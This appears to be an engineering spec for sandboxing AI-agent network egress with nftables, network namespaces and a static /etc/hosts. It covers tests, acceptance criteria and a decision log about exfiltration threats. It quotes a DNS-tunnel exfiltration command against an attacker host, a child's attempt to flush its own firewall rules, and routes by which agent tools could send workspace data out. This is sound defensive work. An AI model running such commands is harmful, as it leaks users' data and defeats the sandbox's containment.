> **Lane:** the Linux-only integration tests run on the **`test-integration-runner`** lane created in M84_003 (`zig build --build-file build_runner.zig test-integration`) — they create net namespaces, install nftables rules, and assert kernel-level connect refusal, a privileged-Linux environment. `builtin.os.tag == .linux`-gated (`SkipZigTest` on macOS). macOS dev-loop proof = cross-compile the runner TEST graph for both linux targets.

| Dimension | Tier | Test | Asserts (concrete inputs → expected output) |
|-----------|------|------|---------------------------------------------|
| 1.1 | unit | `test_no_share_net_on_any_sandboxed_tier` | builder output contains no `--share-net`; net namespace unshared on every sandboxed tier |
| 1.2 | integration-runner | `test_egress_fails_closed_without_rules` | nft setup absent → child `connect()` to any host fails; lease classified egress-failure, not open-net |
| 2.1 | integration-runner | `test_allowed_ip_reachable` | allowlist=\{inference IP\}; child reaches it; request succeeds |
| 2.2 | integration-runner | `test_denied_ip_dropped` | child connect to a non-allowed IP → dropped; `egress_denied` logged (IP only) |
| 2.3 | integration-runner | `test_link_local_and_private_denied` | child connect to 127.0.0.1 (host) / 169.254.x / RFC1918 (outside veth subnet) → dropped |
| 3.1 | unit + integration-runner | `test_inference_host_always_allowed` | configured inference endpoint resolved + present in the nft set; unresolvable → fail-closed at setup |
| 3.2 | unit | `test_allowlist_not_child_extendable` | an `allow_hosts`-like value in child env/lease does NOT widen the nft set |
| 3.3 | integration-runner | `test_no_forwarding_resolver_reachable` + `test_dns_tunnel_query_dropped` | child has no port-53 path to a forwarding resolver; a `dig data.x.com @resolver` tunnel attempt is dropped; allowlisted-name resolution still succeeds via the parent-provided path |
| 3.4 | integration-runner | `test_denied_named_host_fails_fast_at_resolution` | an off-allowlist **named** host misses `/etc/hosts` with port 53 dropped → fast resolution failure (no hang); an allowed host resolves via `/etc/hosts` and connects. *(Structured `blocked_egress` capture + its DNS stub → deferred follow-up.)* |
| Inv 6 | integration-runner | `test_child_cannot_flush_egress_rules` | a child runs `nft flush` / `ip route del` with its in-userns caps → the enforced egress set is unchanged (rules are host-side, root-owned) |
| Inv 7 | integration-runner | `test_no_open_net_half_state` | a build that emits `--share-net` AND skips the nft install is rejected; the child is never left in the host netns without nft (own-netns XOR host-share) |

- **Regression:** existing runner suite (`make test-unit-zigrunner`) + a legitimate end-to-end lease (inference + an allowed tool host) still pass — the network-enabled agent still works.
- **Idempotency/replay:** N/A.
- **Deferred (§5, untrusted-GA — NOT in this slice):** `test_raw_ip_dns_pin`, `test_unknown_or_encrypted_sni_denied`, name-based `CONNECT` allowlisting.

---

## Acceptance Criteria

- [ ] No sandboxed tier emits `--share-net`; child net namespace unshared — verify: `test_no_share_net_on_any_sandboxed_tier`
- [ ] Allowed inference IP reachable; non-allowed IP dropped — verify: `test_allowed_ip_reachable` + `test_denied_ip_dropped`
- [ ] Link-local / loopback-to-host / private-range dropped — verify: `test_link_local_and_private_denied`
- [ ] nft/netns setup failure fails closed (no open-net fallback); no `--share-net`+skipped-nft half-state — verify: `test_egress_fails_closed_without_rules` + `test_no_open_net_half_state`
- [ ] Egress rules root-owned (host side of the veth); a sandboxed child cannot `nft flush` / reconfigure its own firewall — verify: `test_child_cannot_flush_egress_rules`
- [ ] Inference endpoint always resolved into the nft set; allowlist not child-extendable — verify: `test_inference_host_always_allowed` + `test_allowlist_not_child_extendable`
- [ ] No forwarding DNS resolver reachable from the child; DNS-tunnel attempt dropped (parent-provided resolution) — verify: `test_no_forwarding_resolver_reachable` + `test_dns_tunnel_query_dropped`
- [ ] A denied **named** egress fails **fast at resolution** (no 30s hang) with the hostname in the agent's tool error; structured `blocked_egress` chip deferred to follow-up — verify: `test_denied_named_host_fails_fast_at_resolution`
- [ ] Child holds no datastore credential; runner not built with postgres engine — verify: `grep -n 'engines' build_runner.zig` shows `base,sqlite`; no DB host in the resolved allowlist
- [ ] `make lint` clean · `make test-unit-zigrunner` + `make test-integration-runner` pass · cross-compile both linux targets
- [ ] `gitleaks detect` clean · no file over 350 lines added
- [ ] `runner_fleet.md` documents the launch egress model + notes the §5 L7 proxy as the untrusted-GA follow-up
- [ ] (L7 DNS-pinning proxy, raw-IP/SNI/DoH resistance → §5, deferred to untrusted-runner GA)

---

## Eval Commands (post-implementation)

```bash
# E1: no --share-net anywhere in the network builder
git grep -n 'share-net' src/runner && echo "FAIL: share-net still present" || echo "PASS"
# E2: runner unit + app suites (legitimate path unchanged)
make test-unit-zigrunner 2>&1 | tail -5 && make test 2>&1 | tail -5
# E3: egress integration lane (allowed/denied IP, link-local, no-rules fail-closed)
make test-integration-runner 2>&1 | tail -10
# E4: dev-loop proof — Linux-only bodies compile
zig build --build-file build_runner.zig test-integration -Dtarget=x86_64-linux 2>&1 | tail -3
# E5: runner is base,sqlite (no DB credential in the child)
grep -n 'engines' build_runner.zig
# E6: gitleaks
gitleaks detect 2>&1 | tail -3
```

---

## Dead Code Sweep

**1. Orphaned files — none expected.**

| File to delete | Verify |
|----------------|--------|
| N/A — refactor of the network path, no file removed | — |

**2. Orphaned references.** The log-only `log.debug("allowlist_host", …)` emit and the `--share-net` literal are removed when enforcement lands; grep must show zero remaining `share-net` in `src/runner` (E1).

---

## Discovery (consult log)

- **Origin (Jun 05, 2026):** Orly CTO adverse review of M84_003. Pinned residual: `registry_allowlist` emits `--share-net` (`network.zig:68-76`) = full host egress; allowlist log-only (`runner_network_policy.zig`). M84_003 §5.1 characterized this gap; this workstream closes it.
- **Threat re-scoping with Indy (Jun 05, 2026):** the deployment is **baremetal, not a VM** → no cloud metadata service. **No co-located Postgres/Redis** and **no inbound listener** on the runner box (`control_plane_client.zig` is outbound `std.http.Client.fetch`; no `listen`/`bind`). So lateral movement and loopback-to-datastore are moot; the surviving threat is **outbound secret exfiltration**.
  - **Memory path confirmed:** the runner is built `.engines = "base,sqlite"` (`build_runner.zig`); the untrusted child never holds a DB DSN → Invariant 3.
- **Adversarial review + launch pull-forward (Jun 10, 2026, three-agent code-grounded):** the original whole-spec deferral was refuted. Findings (file:line):
  - `--share-net` on the **production** `registry_allowlist` tier (baremetal sets it; `sandbox_args.zig:126` `--unshare-all` then `network.zig:73` `--share-net`); allowlist log-only (`runner_network_policy.zig`). The code default `deny_all` has no network.
  - in-engine policy wraps only `http_request` (`tool_bridge.zig:39`); `bash`/`git`/`web_fetch` carry none (`tool_builders.zig`).
  - the lease carries the raw secret inline (`protocol_test.zig:239`); `secrets_resolve.zig:48` reads vault creds verbatim; `docs/AUTH.md:204` "static, long-lived, never expires" → the "short-lived/least-privilege tool secrets" compensating control is **unbuilt**.
  - **Verdict:** PULL-SLICE — ship the kernel default-deny half (own-netns + nftables IP-allowlist) for launch; defer the L7 proxy (§5) to untrusted-GA. Honest caveat: github.com-via-github exfil stays open until scoped tokens land (§4.1).
  - **Indy decision (verbatim, Jun 10, 2026):** _"I want to go with 1"_ — option 1 (nftables egress slice). Context: chosen over (2) build short-lived tokens, (3) interim deny_all for token-bearing leases, (4) accept+document.
- **Greptile review (PR #384, Jun 10, 2026):** flagged a **DNS-tunnel exfil residual** — the draft Interfaces contract left `(∪ DNS resolver, if in-child resolution)` open, which a forwarding resolver turns into a `dig data.attacker.com @resolver` channel the IP-allowlist cannot see (connect target is the *allowed* resolver IP). **Resolved by closing it, not accepting it:** §3.3 mandates parent-provided resolution / a non-forwarding stub; Interfaces, Failure Modes, Invariant 2, §4, Test Spec + Acceptance updated. Verdict: P2, VALID & ACTIONABLE.
- **Source correction (Indy, Jun 10, 2026):** the original draft invented an "operator-declared `allow_hosts` parse in `daemon/config.zig`" — wrong. The per-zombie allowlist **already exists and is carried**: TRIGGER.md `x-usezombie.network.allow` (the schema's *"kernel-level egress rule, rejected at packet time"*) → `execution_policy.NetworkPolicy` → merged with `REGISTRY_ALLOWLIST` per M2_001/M3_001. `runner_network_policy.zig`'s own header names the remaining gap as *"Phase 2 (nftables)"*. So this workstream is **purely the Phase-2 enforcement** of an existing, merged, lease-carried allowlist — no new sourcing. **Indy go (verbatim):** _"Build it (slim M84_004)"_ — token-bearing agents are in the launch set, so the hole must close; re-source to `NetworkPolicy` and ship the nftables enforcement.
- **Author-facing denial decision (Indy, Jun 10, 2026):** in PLAN, surfaced that `egress_denied` as originally specced was an operator-only **log line** (journald) — the end user (zombie author) would get only a silent connect timeout and never learn *which* host to declare. Indy: _"would it not make sense to inform the user?"_ → **yes.** Added **Dimension 3.4**: the parent-provided stub resolver answers an off-list name with `NXDOMAIN` (fast fail, no 30s hang, no wasted lease wall-clock) and **records** the denied name; the **parent** (tamper-proof against the child, Invariant 6) folds it into `ExecutionResult.blocked_egress`, which rides the existing `report` path (`ExecutionResult` → `ReportRequest` → `core.zombie_events`) to the author's run-detail surface. This biases the §3.3 resolution mechanism to the **stub** option (only a resolver process can record an off-list query). **→ Superseded below (Jun 10): simplified to static `/etc/hosts`; the structured `blocked_egress` field + DNS stub deferred to a follow-up.**
- **Simplification to static `/etc/hosts` + inference-host hoist (Indy, Jun 10, 2026):** Indy challenged the DNS-stub complexity (_"I dont wanna complicate things... if [we] dont implement this what do we lose?"_). Re-derived: the stub's *only* marginal value over a static `/etc/hosts` (+ nft dropping all port 53) is **structured** capture of a denied name; security (arbitrary-host **and** DNS-tunnel exfil) plus fast-fail are fully delivered by the simpler static-hosts path — which is also *less* of a tunnel footgun (no resolver to misconfigure). **Decision: static `/etc/hosts` for launch; structured `blocked_egress` + the DNS stub deferred to a fast follow-up** (best-effort fast-fail surfacing covers the silent-timeout concern in the interim). Separately, Indy asked whether the allowlist/API run _"on the LLM end."_ Confirmed **no** — `network.allow` is parsed at the control plane (`yaml_frontmatter.zig:264`), shipped on the lease (`LeasePayload.policy`), and enforced by the **parent** (nft + `/etc/hosts`, root-owned, Invariant 6) before the child runs; the agent's copy is advisory. The one egress-config still derived child-side — the **inference endpoint URL** (built from `provider` at the NullClaw layer) — is **hoisted to the control plane onto the lease** so the parent allowlists exactly what the engine dials (Dim 3.1, no drift).
- **Threat-model correction against code (Indy, Jun 10, 2026):** Indy challenged the secret-exfil framing (_"how does the attacker actually get the PAT/key?"_). Verified in code: secret **values** are materialized only inside `http_request` (`secret_substitution.zig`, post-sandbox boundary), L7-allowlist-checked, and redacted from frames; `git` has no creds wired (`buildGit`), and no other tool substitutes — so the agent cannot read or route a secret value through `bash`/`web_fetch`. The real day-1 hole is different: `web_fetch` is `allowed_domains = &.{}` (NullClaw empty = **allow-all**, `web_fetch.zig:24`/`:66`) and `bash` is `policy = null` (`buildShell`), so they bypass the per-zombie allowlist that **only** `http_request` honors — exfiltrating the agent's **workspace data** (private repo, fetched files, issue/PR text) and weaponizing the box to any host. The egress slice's precise job: make the allowlist apply to **every** tool at L4/kernel, closing the unpoliced-tool holes; it is defense-in-depth for the (already-protected) secret values, and does **not** close the allowed-write-host residual (§4.1, scoped tokens). Spec Priority / LAUNCH-SLICE / Problem / Prioritization tightened to this code-grounded model.
- **Module redesign + configurable registry (Indy, Jun 10, 2026):** Indy directed (a) a dedicated **`src/runner/network/` directory** of **file-as-struct (`@This()`) modules** in the std idiom (facade like `std.net`; lifecycle `EgressScope` mirroring `engine/cgroup.zig`'s `CgroupScope`; pure netlink serializers golden-byte-tested; `Socket` as the only Linux-gated kernel-touch — addresses via `std.Io.net.IpAddress`), and (b) the registry baseline **fed from outside, not a compile-time constant**: `Allowlist.build` takes `registry` as a parameter, sourced from a new `RUNNER_REGISTRY_ALLOWLIST` env var parsed at daemon config load (comma-separated), with a named default as fallback only. `engine/network.zig` + `engine/runner_network_policy.zig` fold into the new dir (RULE NLR/NLG — move, don't shim), removing the dead `mergeAllowlists`. Files-Changed updated to this layout.
- **Deferrals** — the L7 DNS-pinning proxy (§5) is deferred to untrusted-runner GA per the Jun 10 decision above (Indy-acked option 1, which is "pull the nft slice, defer the proxy"). Any *further* deferral needs a fresh Indy-acked quote here.
- **Skill chain outcomes** — {`/write-unit-test`, `/review`, `/review-pr` results.}

## Skill-Driven Review Chain (mandatory)

| When | Skill | What it does | Required output |
|------|-------|--------------|-----------------|
| After implementation, before CHORE(close) | `/write-unit-test` | Audits negative/regression coverage vs this Test Specification. | Clean. Iteration count + coverage in Discovery. |
| After tests pass, before CHORE(close) | `/review` | Adversarial diff review vs Invariants, Failure Modes, `dispatch/write_zig.md`, `docs/architecture/runner_fleet.md`. | Clean OR every finding dispositioned. |
| After `gh pr create` | `/review-pr` | Review-comments the open PR against the immutable diff. | Comments addressed before human review/merge. |

## Verification Evidence

| Check | Command | Result | Pass? |
|-------|---------|--------|-------|
| Runner unit | `make test-unit-zigrunner` | {paste snippet} | |
| App suite (regression) | `make test` | {paste snippet} | |
| Egress integration | `make test-integration-runner` | {paste snippet} | |
| Lint | `make lint` | {paste snippet} | |
| Cross-compile (TEST graph) | `zig build --build-file build_runner.zig test-integration -Dtarget=x86_64-linux && -Dtarget=aarch64-linux` | {paste snippet} | |
| Gitleaks | `gitleaks detect` | {paste snippet} | |

---

## Out of Scope

- **The L7 DNS-pinning forward proxy** — §5, deferred to untrusted-runner GA (name-based SNI/`CONNECT` allowlisting, DNS-rebinding pin, encrypted-SNI/DoH default-deny). The launch slice is the IP-layer foundation it builds on.
- **M84_003's process-boundary hardening** (env/fd/cap/kill) — that is the sibling spec (DONE, #370); this one owns only network egress.
- **Inbound network policy** — the runner box has no listener; nothing to filter inbound.
- **Cloud metadata / IMDS blocking** — not applicable to the baremetal deployment; the link-local deny (Dim 2.3) covers it for free if a node ever runs in a VM.
- **Rotating / scoping tenant secrets** so a leak is lower-impact — the real mitigation for the §4.1 allowed-host exfil channel, but a credential-model change, not a runner network patch. Names the follow-up (this is option 2 from the Jun 10 decision; option 1 was chosen for launch, option 2 remains the complete-seal follow-up).
